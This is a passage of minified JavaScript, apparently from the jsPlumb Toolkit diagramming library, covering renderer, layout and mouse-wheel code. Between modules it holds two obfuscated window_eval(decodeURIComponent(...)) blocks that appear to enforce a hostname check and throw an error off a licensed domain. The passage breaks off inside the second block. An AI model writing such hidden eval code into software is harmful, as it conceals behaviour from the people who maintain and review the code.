            var b = J.getEdgeType(a.data),
                c = {type: b, connectionType: b, data: a.data, cost: a.getCost(), directed: a.isDirected()},
                d = Fa.getEdgeDefinition(b);
            !function (a) {
                if (d) for (var b = 0; b < a.length; b++) d[a[b]] && (c[a[b]] = d[a[b]])
            }(["connector", "endpoints", "endpoint", "endpointStyles", "endpointStyle"]), c.anchor && !c.anchors && (c.anchors = [c.anchor, c.anchor], delete c.anchor), c.endpoint && !c.endpoints && (c.endpoints = [c.endpoint, c.endpoint], delete c.endpoint);
            var e = function (a, b, c, d, e) {
                if (d && d[c]) {
                    var f = a[b] || [d[c], d[c]];
                    f[e] = d[c], a[b] = f
                }
            }, f = function (b, d) {
                if (a[b].getNode) {
                    var f = a[b].getNode(), g = a[b].getFullId(), h = Ra[g] || ia[g];
                    c[b] = null != h ? h : ia[g], null == c[b] && (c[b] = ga[J.getNodeId(f.data)]);
                    var i = Fa.getPortDefinition(a[b].getType());
                    e(c, "anchors", "anchor", i, d), e(c, "endpoints", "endpoint", i, d)
                } else {
                    var j = J.getNodeId(a[b].data), h = 0 === d ? Sa[j] : Ta[j];
                    c[b] = null == h ? ga[j] || ja[j] : h
                }
            };
            return f("source", 0), f("target", 1), c
        }, Ja = {};
        this.asynchronousPortRendered = function (a, b, c) {
            var d = J.getPortId(c), e = Ja[d], f = b.getPort(d);
            if (!e) return f;
            try {
                q(e.object, a, d, e.objectType, e.def, e.node, e.jtkClass, e.jtkAttributeName, e.makeDraggable), ia[b.id + J.getGraph().getPortSeparator() + d] = a;
                return r(a, f, ja[b.id] || ga[b.id], b), n(), f
            } catch (a) {
                return jsPlumbToolkitUtil.log("Cannot finish asynchronous render of port", a), null
            } finally {
                delete Ja[d]
            }
        };
        var Ka = [];
        this.addUnrenderedEdge = function (a, b) {
            Ka.push([a, b])
        };
        var La = function (a, b, c, d, e, g, h, i) {
                return function (j, k, l) {
                    var m, n = b(k), o = null, p = c(k), r = Fa[d](p), s = k;
                    if (R) {
                        s = f.extend({}, r ? r.parameters || {} : {}), f.extend(s, k);
                        var t = {};
                        for (m in s) s.hasOwnProperty(m) && null != s[m] && (s[m].constructor == Function ? t[m] = s[m](k) : t[m] = s[m]);
                        s = t
                    }
                    if (Y && "port" === a) return void(Ja[n] = {
                        id: n,
                        data: s,
                        objectType: a,
                        def: r,
                        jtkClass: h,
                        jtkAttributeName: i,
                        makeDraggable: g,
                        node: l,
                        object: j
                    });
                    if (r) {
                        var u = r.template || "jtk-template-" + p;
                        o = r.templateRenderer ? r.templateRenderer(u, s, J, a, I) : Q.render(u, s, J, a, I)
                    } else o = e(s, n);
                    return q(j, o, n, a, r, l, h, i, g), o
                }
            }, Ma = La("node", J.getNodeId, J.getNodeType, "getNodeDefinition", C, !0, k.NODE, i.NODE),
            Na = La("port", J.getPortId, J.getPortType, "getPortDefinition", C, !1, k.PORT, i.PORT),
            Oa = La("group", J.getNodeId, J.getNodeType, "getGroupDefinition", C, !1, k.GROUP, i.GROUP);
        this.initialize = function () {
            var b, c, d, e, f;
            if (J.setSuspendGraph(!0), $.setSuspendDrawing(!0), a.jsPlumbInstance) {
                a.jsPlumbInstance.select().each(function (a) {
                    oa[a.edge.getId()] = a
                }), c = a.jsPlumbInstance.getManagedElements();
                for (var g in c) {
                    var h = c[g].el;
                    ga[h.jtk.node.id] = h, ha[a.jsPlumbInstance.getId(h)] = h.jtk.node
                }
                Ya.doImport && Ya.doImport(ga, oa)
            } else {
                for (b = 0, d = J.getGroupCount(); b < d; b++) e = J.getGroupAt(b), W(e) && Ba(e);
                for (b = 0, d = J.getNodeCount(); b < d; b++) c = J.getNodeAt(b), W(c) && Aa(c);
                var i = function (a) {
                    var b = J.getAllEdgesFor(a);
                    for (f = 0; f < b.length; f++) if (b[f].source == a || b[f].source.getNode && b[f].source.getNode() == a) {
                        var c = Fa.getEdgeDefinition(J.getNodeType(b[f].data));
                        if (c && !0 === c.ignore) continue;
                        var d = Ia(b[f]);
                        if (null != d.source && null != d.target) {
                            d.doNotFireConnectionEvent = !0;
                            var e = $.connect(d);
                            null != e && (e.edge = b[f], oa[b[f].getId()] = e, sa(d.type, b[f], e))
                        }
                    }
                };
                for (b = 0, d = J.getNodeCount(); b < d; b++) c = J.getNodeAt(b), ga[c.id] && i(c);
                for (b = 0, d = J.getGroupCount(); b < d; b++) c = J.getGroupAt(b), ja[c.id] && i(c)
            }
            this.relayout(), $.setSuspendDrawing(!1, !0), J.setSuspendGraph(!1)
        }, this.getContainer = function () {
            return L
        }, this.getContainerId = function () {
            return _
        }, this.getRenderedElement = function (a) {
            if (null == a) return null;
            var b = a.getFullId();
            return a.objectType === h.portType ? ia[b] : a.objectType === h.groupType ? ja[b] : ga[b]
        }, this.getRenderedNode = function (a) {
            return ga[a]
        }, this.getRenderedGroup = function (a) {
            return ja[a]
        }, this.getRenderedPort = function (a) {
            return ia[a]
        }, this.getRenderedConnection = function (a) {
            return oa[a]
        }, this.getRenderedEndpoint = function (a) {
            var b = B(a), c = null;
            return b && b.obj && "Port" === b.obj.objectType && $.selectEndpoints({element: b.el}).each(function (a) {
                a.graph && a.graph.port && a.graph.port === b.obj && (c = a)
            }), c
        };
        var Pa = function (a) {
            var b = $.extend({
                container: L, getElementForNode: function (a) {
                    return ga[a] || ja[a]
                }
            }, a);
            if (b.jsPlumbToolkit = J, b.adapter = new p(I), !c.Layouts[b.type]) throw"no such layout [" + b.type + "]";
            return b.locationFunction || (b.locationFunction = function (a) {
                return [g.data(a.data, T), g.data(a.data, U)]
            }), new c.Layouts[b.type](b)
        }, Qa = function (a, b) {
            var d = I._getGroupDragArea ? I._getGroupDragArea(b) : ja[b.id], e = $.extend({
                container: d, getElementForNode: function (a) {
                    return ga[a]
                }, negativeValuesAllowed: !1
            }, a);
            if (!c.Layouts[e.type]) throw"no such layout [" + e.type + "]";
            return e.jsPlumbToolkit = J, e.adapter = new o(b, I), e.locationFunction || (e.locationFunction = function (a) {
                return [g.data(a.data, T), g.data(a.data, U)]
            }), new c.Layouts[e.type](e)
        };
        this.adHocLayout = function (a) {
            if (a) {
                var b = K;
                this.setLayout(a), K = b
            }
        }, this.setLayout = function (a, b) {
            if (a) {
                var c = f.extend({jsPlumb: this.getJsPlumb()}, a);
                K = Pa(c), b || I.refresh()
            }
        }, this.getLayout = function () {
            return K
        }, this.getMagnetizedElements = function () {
            return null != K ? K.getMagnetizedElements() : []
        }, this.magnetize = function (a) {
            null != K && K.magnetize(a)
        }, this.refresh = function (a) {
            O || a && !P || (K ? K.layout(function () {
                "undefined" != typeof window ? window.setTimeout($.repaintEverything, 0) : $.repaintEverything()
            }) : $.repaintEverything())
        }, this.setRefreshAutomatically = function (a) {
            P = a
        }, this.relayout = function (a) {
            O || (K ? K.relayout(a, function () {
                I.relayoutGroups(), $.repaintEverything(), this.fire("relayout", this.getBoundsInfo())
            }.bind(this)) : $.repaintEverything())
        }, this.relayoutGroups = function () {
            J.eachGroup(function (a, b) {
                I.relayoutGroup(b)
            })
        }, this.relayoutGroup = function (a) {
            if (!a.layout) {
                var b = B(a);
                if (!b.obj || !b.obj.layout) return;
                a = b.obj
            }
            a.layout.relayout(), I.sizeGroupToFit(a, !0), $.revalidate(ja[a.id]), I.fire(l.groupRelayout, a, ja[a.id])
        }, this.getPath = function (a) {
            var b = J.getPath(a);
            return b && (b.setVisible = function (a) {
                I.setVisible(b, a)
            }, b.addNodeClass = function (a) {
                b.eachNode(function (b, c) {
                    $.addClass(ga[c.id], a)
                })
            }, b.removeNodeClass = function (a) {
                b.eachNode(function (b, c) {
                    $.removeClass(ga[c.id], a)
                })
            }, b.addEdgeClass = function (a) {
                b.eachEdge(function (b, c) {
                    oa[c.getId()].addClass(a)
                })
            }, b.removeEdgeClass = function (a) {
                b.eachEdge(function (b, c) {
                    oa[c.getId()].removeClass(a)
                })
            }, b.addClass = function (a) {
                this.addNodeClass(a), this.addEdgeClass(a)
            }, b.removeClass = function (a) {
                this.removeNodeClass(a), this.removeEdgeClass(a)
            }), b
        }, this.getPosition = function (a) {
            var b = this.getLayout();
            if (b) {
                var c = B(a).id;
                return b.getPosition(c)
            }
        }, this.getSize = function (a) {
            return $.getSize(B(a).el)
        }, this.getCoordinates = function (a) {
            var b = this.getLayout();
            if (b) {
                var c = B(a), d = b.getPosition(c.id), e = $.getSize(c.el);
                return {x: d[0], y: d[1], w: e[0], h: e[1]}
            }
        };
        var Ra = {}, Sa = {}, Ta = {}, Ua = function (a, b, c) {
            var g = a.value("port-id"), h = a.value("port-type") || "default",
                i = a.value("scope") || $.getDefaultScope(), j = J.getNodeType(b), k = Fa.getNodeDefinition(j),
                l = Fa.getPortDefinition(g, k), m = Fa.getPortDefinition(h, k), n = e.merge(m, l),
                o = null == n ? {} : d.populate(n, b.data), p = function (a) {
                    return function (c) {
                        var d = b.getPort(g), e = [{
                            portId: g,
                            nodeId: b.id,
                            port: d,
                            node: b,
                            portType: h,
                            endpoint: c.endpoint,
                            anchor: c.anchor
                        }];
                        a.apply(a, e)
                    }
                }, q = function (a) {
                    return function (b) {
                        var c = [{connection: b.connection || b, source: B(b.source), target: B(b.target), scope: b.scope}];
                        return a.apply(a, c)
                    }
                }, r = o.edgeType || a.value("edge-type") || "default", s = {
                    paintStyle: "connectorStyle",
                    hoverPaintStyle: "connectorHoverStyle",
                    overlays: "connectorOverlays",
                    endpointStyle: "paintStyle"
                }, t = Fa.getEdgeDefinition(r);
            if (t) for (var u in t) {
                var v = s[u] || u;
                null == o[v] && (o[v] = t[u])
            }
            if (o.connectionType = r, o.portId = g, o.portType = h, o.scope = i, o.parameters = o.parameters || {}, o.parameters.portId = g, o.parameters.portType = h, o.parameters.edgeType = r, o.parameters.scope = i, o.parameters.nodeId = b.id, o.events = {}, n.events) for (u in n.events) o.events[u] = p(n.events[u]);
            if (n.interceptors) for (u in n.interceptors) o[u] = q(n.interceptors[u]);
            var w = a.value("anchor-x"), x = a.value("anchor-y"), y = a.value("orientation-x"),
                z = a.value("orientation-y"), A = a.value("offset-x"), C = a.value("offset-y");
            return null != w && null != x && (o.anchor = [parseFloat(w), parseFloat(x), parseInt(y || "0", 10), parseInt(z || "0", 10), parseFloat(A || "0"), parseFloat(C || "0")]), f.extend(o, c || {}), o.events.anchorChanged = function (a) {
                I.fire("anchorChanged", {
                    portId: g,
                    nodeId: b.id,
                    portType: h,
                    node: b,
                    port: b.getPort(g),
                    endpoint: a.endpoint,
                    anchor: a.anchor
                })
            }, o
        }, Va = function (a) {
            this.element = a.parentNode, this.value = function (b, c) {
                var d = a.getAttribute(b);
                return null == d ? c : d
            }, this.setValue = function (b, c) {
                a.setAttribute(b, c)
            }, this.findDataValues = function (b) {
                for (var c = 0; c < a.attributes.length; c++) {
                    var d = a.attributes[c];
                    0 === d.name.indexOf("data-") && (b[d.value] = d.name.split("-")[1])
                }
            }
        }, Wa = function (a, b, c) {
            this.element = b, this.port = c, this.value = function (b, c) {
                var d = a[b.replace(/(\-\w)/g, function (a) {
                    return a[1].toUpperCase()
                })];
                return null == d ? c : d
            }, this.findDataValues = function (b) {
                for (var c in a) 0 === c.indexOf("data-") && (b[a[c]] = c.split("-")[1])
            }, this.setValue = function (a, c) {
                b.setAttribute(a, c)
            }
        }, Xa = function (a, b) {
            var c, d, e = f.getSelector(a, j.PORT), g = f.getSelector(a, j.SOURCE), h = f.getSelector(a, j.TARGET);
            for (c = 0; c < g.length; c++) d = new Va(g[c]), u(d, b);
            for (c = 0; c < h.length; c++) d = new Va(h[c]), v(d, b);
            for (c = 0; c < e.length; c++) d = new Va(e[c]), s(d, b)
        };
        this.setLayout(a.layout, !0), this.storePositionsInModel = function (a) {
            a = a || {};
            var b = a.leftAttribute || "left", c = a.topAttribute || "top", d = K.getPositions();
            for (var e in d) {
                var f = J.getNode(e) || J.getGroup(e);
                f && (g.data(f.data, b, d[e][0]), g.data(f.data, c, d[e][1]))
            }
            J.eachGroup(function (a, d) {
                var e = d.getNodes(), f = d.layout.getPositions();
                for (a = 0; a < e.length; a++) g.data(e[a].data, b, f[e[a].id][0]), g.data(e[a].data, c, f[e[a].id][1])
            })
        }, this.storePositionInModel = function (a) {
            var b = "string" == typeof a ? a : a.id, c = "string" == typeof a ? "left" : a.leftAttribute || "left",
                d = "string" == typeof a ? "top" : a.topAttribute || "top", e = J[a.group ? "getGroup" : "getNode"](b),
                f = e.group ? e.group.layout.getPosition(b) : K.getPosition(b);
            return e && (g.data(e.data, c, f[0]), g.data(e.data, d, f[1])), f
        }, this.setPosition = function (a, b, c, d, e) {
            return w({
                info: null,
                node: a,
                x: b,
                y: c,
                doNotUpdateElement: d,
                animateFrom: null,
                animateOptions: null,
                updateLayout: !0 !== e
            })
        }, this.animateToPosition = function (a, b, c, d) {
            var e = B(a);
            if (e) {
                var f = K.getPosition(e.id);
                w({info: e, node: a, x: b, y: c, doNotUpdateElement: !1, animateFrom: [f[0], f[1]], animateOptions: d})
            }
        }, this.isVisible = function (a) {
            return A(a, function (a) {
                switch (a.type) {
                    case"Edge":
                        var b = pa(a.obj);
                        return !!b && b.isVisible();
                    case"Node":
                        return !1 !== a.el._jtkVisible
                }
            })
        }, this.setVisible = function (a, b, c) {
            if (null != a) {
                var d = function (a, d) {
                    if (d && (d.style.display = b ? "block" : "none", d._jtkVisible = b, I.fire(l.nodeVisibility, {
                        node: a,
                        el: d,
                        state: b
                    }), !c)) for (var e = J.getAllEdgesFor(a), f = 0; f < e.length; f++) if (b) {
                        var g = e[f].source.getNode ? e[f].source.getNode() : e[f].source,
                            h = e[f].target.getNode ? e[f].target.getNode() : e[f].target, i = g === a ? h : g,
                            j = I.isVisible(i);
                        j && z(e[f], b, c)
                    } else z(e[f], b, c)
                }, e = function (a) {
                    var c = a.getFullId();
                    Ra[c].setVisible(b)
                };
                A(a, function (a) {
                    switch (a.type) {
                        case"Edge":
                            z(a.obj, b, c);
                            break;
                        case"Node":
                            d(a.obj, a.el);
                            break;
                        case"Port":
                            e(a.obj)
                    }
                })
            }
        }, this.addToPosse = function (a, b, c) {
            d.each(a, function (a) {
                var d = B(a);
                d.el && $.addToPosse(d.el, {id: b, active: !1 !== c})
            })
        }, this.setPosse = function (a, b) {
            d.each(a, function (a) {
                var c = B(a);
                c.el && $.setPosse(c.el, b)
            })
        }, this.removeFromPosse = function (a, b) {
            d.each(a, function (a) {
                var c = B(a);
                c.el && $.removeFromPosse(c.el, b)
            })
        }, this.removeFromAllPosses = function (a) {
            d.each(a, function (a) {
                var b = B(a);
                b.el && $.removeFromAllPosses(b.el)
            })
        }, this.setPosseState = function (a, b, c) {
            d.each(a, function (a) {
                var d = B(a);
                d.el && $.setPosseState(d.el, b, c)
            })
        }, this.destroy = function () {
            for (var a, b = 0; b < wa.length; b++) try {
                a = wa[b], J.unbind(a.event, a.fn)
            } catch (b) {
                e.log("WARN: Could not unbind event " + a.event + " during destroy operation.")
            }
            this._destroy && this._destroy(), this._onDestroy && this._onDestroy(this)
        };
        var Ya = {
            jsPlumb: $,
            toolkit: J,
            container: L,
            containerId: _,
            getConnectionsForEdges: qa,
            getConnectionForEdge: pa,
            getElement: function (a) {
                return ga[a] || ja[a]
            },
            getNodeForElementId: function (a) {
                return ha[a]
            },
            getGroupForElementId: function (a) {
                return la[a]
            },
            getObjectInfo: B,
            nodeMap: function () {
                return ga
            },
            portMap: function () {
                return ia
            },
            groupMap: function () {
                return ja
            },
            reverseGroupMap: function () {
                return la
            },
            reverseNodeMap: function () {
                return ha
            },
            bindToToolkit: function (a, b) {
                m(a, b)
            }
        };
        return Ya
    };
    b.AbstractRenderer = q, b.DOM = function (a) {
        q.apply(this, arguments), m.apply(this, arguments)
    }
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";

    function a(a, b, c) {
        return function (d) {
            return d[a] / b * (c ? -1 : 1)
        }
    }

    var b = this, c = "deltaY", d = "deltaX", e = "wheelDeltaY", f = "wheelDeltaX", g = {
            webkit: {mac: a(c, 120), win: a(c, 100)}, safari: function (b) {
                return a(e, 120, !0)
            }, firefox: {
                mac: function (a) {
                    return a.deltaY * (1 === a.deltaMode ? 25 : 1) * -1 / 120
                }, win: function (a) {
                    return -1 * a.deltaY / 3
                }
            }, ie: function (a) {
                return a.wheelDelta / 120
            }, default: function (a) {
                return a.deltaY || a.wheelDelta
            }
        }, h = {
            webkit: {mac: a(d, 120), win: a(d, 100)}, safari: function (b) {
                return a(f, 120, !0)
            }, firefox: {
                mac: function (a) {
                    return a.deltaX * (1 === a.deltaMode ? 25 : 1) * -1 / 120
                }, win: function (a) {
                    return -1 * a.deltaX / 3
                }
            }, ie: function (a) {
                return a.wheelDelta / 120
            }, default: function (a) {
                return a.deltaX || a.wheelDelta
            }
        }, i = /Mac/.test(navigator.userAgent) ? "mac" : "win",
        j = -1 !== navigator.userAgent.indexOf("Firefox") ? "firefox" : /Chrome/.test(navigator.userAgent) ? "webkit" : /Safari/.test(navigator.userAgent) ? "safari" : /WebKit/.test(navigator.userAgent) ? "webkit" : /Trident/.test(navigator.userAgent) ? "ie" : "default",
        k = "function" == typeof g[j] ? g[j] : g[j][i], l = "function" == typeof h[j] ? h[j] : h[j][i],
        m = function (a) {
            return k(a || event)
        }, n = function (a) {
            return l(a || event)
        }, o = function (a, b, c) {
            return function (d) {
                if (!b || null == d.mozInputSource || 1 === d.mozInputSource) {
                    var e = m(d), f = n(d);
                    d.normalizedWheelDelta = e, (!c || d.metaKey || d.ctrlKey) && a(d, f, e, d.metaKey || d.ctrlKey)
                }
            }
        },
        p = "onwheel" in document.createElement("div") ? "wheel" : void 0 !== document.onmousewheel ? "mousewheel" : "DOMMouseScroll";
    b.addWheelListener = function (a, b, c, d) {
        var e = o(b, c, d);
        a.addEventListener ? a.addEventListener(p, e, !1) : a.attachEvent && a.attachEvent("onmousewheel", e)
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bw